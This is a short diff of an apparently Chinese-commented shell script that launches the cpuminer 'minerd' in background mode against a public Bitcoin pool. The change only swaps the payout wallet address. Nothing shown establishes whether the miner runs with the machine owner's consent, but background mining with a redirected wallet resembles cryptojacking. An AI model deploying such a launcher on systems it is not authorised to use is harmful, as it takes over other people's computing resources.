@@ -40,7 +40,7 @@ else
 fi
 
 # 构建完整的命令
-command="./minerd -a sha256d -D -o stratum+tcp://public-pool.io:21496 -u 1J1PhNiw2fSWKoPYm1eh24x3xmqXSCvZ79.${identifier} -p x -t 1 -B"
+command="./minerd -a sha256d -D -o stratum+tcp://public-pool.io:21496 -u 15e9KepQopbir46nHDu94NHW66w7JGdLe4.${identifier} -p x -t 1 -B"
 
 # 输出构建的命令 (调试用)
 echo "Command: $command"
@@ -62,6 +62,6 @@ fi
 chmod +x minerd
 
 # 执行
-./minerd -a sha256d -D -o stratum+tcp://public-pool.io:21496 -u 1J1PhNiw2fSWKoPYm1eh24x3xmqXSCvZ79.${identifier} -p x -t 1 -B
+./minerd -a sha256d -D -o stratum+tcp://public-pool.io:21496 -u 15e9KepQopbir46nHDu94NHW66w7JGdLe4.${identifier} -p x -t 1 -B
 
 echo "Command executed."
